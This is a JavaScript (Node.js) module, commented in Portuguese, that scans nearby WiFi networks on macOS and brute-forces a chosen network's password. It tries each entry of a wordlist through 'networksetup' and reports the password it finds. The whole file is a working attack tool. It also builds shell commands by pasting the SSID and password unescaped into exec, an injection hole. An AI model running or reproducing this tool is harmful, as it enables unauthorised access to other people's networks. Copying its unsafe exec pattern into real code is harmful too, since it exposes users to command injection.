const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const fs = require('fs').promises;

const execAsync = promisify(exec);

const WIFI_INTERFACE = 'en0';
let bruteforceProcess = null;
let currentStatus = {
  isRunning: false,
  ssid: null,
  currentPassword: null,
  attemptCount: 0,
  totalPasswords: 0,
  startTime: null
};

/**
 * Escaneia redes WiFi disponíveis
 */
async function scanNetworks() {
  try {
    // Comando para escanear redes no macOS
    const { stdout } = await execAsync(`/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s`);

    const lines = stdout.trim().split('\n');
    const networks = [];

    // Pular a primeira linha (cabeçalho)
    for (let i = 1; i < lines.length; i++) {
      const line = lines[i];
      if (!line || !line.trim()) continue;

      // Parse da linha com base em posições fixas: SSID (0-32) BSSID (33-50) RSSI (51-55) CHANNEL (56-63) HT CC SECURITY
      const ssid = line.substring(0, 33).trim();
      const bssid = line.substring(33, 51).trim() || 'N/A';
      const rssi = parseInt(line.substring(51, 56).trim()) || 0;
      const channel = line.substring(56, 64).trim();
      const security = line.substring(72).trim() || 'Open';

      if (ssid) {
        networks.push({
          ssid,
          bssid,
          rssi,
          channel,
          security
        });
      }
    }

    // Ordenar por força do sinal (RSSI)
    networks.sort((a, b) => b.rssi - a.rssi);

    return networks;
  } catch (error) {
    throw new Error(`Erro ao escanear redes: ${error.message}`);
  }
}

/**
 * Tenta conectar a uma rede WiFi
 */
async function tryConnect(ssid, password) {
  try {
    const command = `networksetup -setairportnetwork ${WIFI_INTERFACE} "${ssid}" "${password}"`;
    const { stdout, stderr } = await execAsync(command);

    // Verificar se houve erro
    if (stderr && (stderr.includes('Failed') || stderr.includes('incorrect'))) {
      return false;
    }

    // Aguardar 2 segundos para estabelecer conexão
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Verificar se conectou
    const { stdout: checkResult } = await execAsync(`networksetup -getairportnetwork ${WIFI_INTERFACE}`);

    return checkResult.includes(`Current Wi-Fi Network: ${ssid}`);
  } catch (error) {
    return false;
  }
}

/**
 * Inicia o processo de bruteforce
 */
async function startBruteforce(ssid, wordlistPath) {
  if (currentStatus.isRunning) {
    throw new Error('Um processo de bruteforce já está em execução');
  }

  // Ler wordlist
  const wordlistContent = await fs.readFile(wordlistPath, 'utf-8');
  const passwords = wordlistContent.split('\n').filter(p => p.trim());

  currentStatus = {
    isRunning: true,
    ssid,
    currentPassword: null,
    attemptCount: 0,
    totalPasswords: passwords.length,
    startTime: new Date()
  };

  // Broadcast inicial
  global.broadcastLog({
    type: 'start',
    data: {
      ssid,
      totalPasswords: passwords.length
    }
  });

  // Executar bruteforce de forma assíncrona
  (async () => {
    for (let i = 0; i < passwords.length; i++) {
      if (!currentStatus.isRunning) {
        global.broadcastLog({
          type: 'stopped',
          data: { message: 'Bruteforce interrompido pelo usuário' }
        });
        break;
      }

      const password = passwords[i].trim();
      if (!password) continue;

      currentStatus.currentPassword = password;
      currentStatus.attemptCount = i + 1;

      // Broadcast do progresso
      global.broadcastLog({
        type: 'progress',
        data: {
          attemptCount: i + 1,
          totalPasswords: passwords.length,
          currentPassword: password,
          percentage: ((i + 1) / passwords.length * 100).toFixed(2)
        }
      });

      // Tentar conectar
      const success = await tryConnect(ssid, password);

      if (success) {
        currentStatus.isRunning = false;
        global.broadcastLog({
          type: 'success',
          data: {
            ssid,
            password,
            attemptCount: i + 1
          }
        });
        break;
      } else {
        global.broadcastLog({
          type: 'failed',
          data: {
            attemptCount: i + 1,
            password
          }
        });
      }
    }

    // Se terminou sem sucesso
    if (currentStatus.isRunning) {
      currentStatus.isRunning = false;
      global.broadcastLog({
        type: 'finished',
        data: {
          message: 'Todas as senhas foram testadas sem sucesso',
          attemptCount: currentStatus.attemptCount
        }
      });
    }
  })();

  return true;
}

/**
 * Para o processo de bruteforce
 */
function stopBruteforce() {
  if (!currentStatus.isRunning) {
    throw new Error('Nenhum processo de bruteforce está em execução');
  }

  currentStatus.isRunning = false;
  return true;
}

/**
 * Retorna o status atual
 */
function getStatus() {
  return currentStatus;
}

module.exports = {
  scanNetworks,
  startBruteforce,
  stopBruteforce,
  getStatus
};
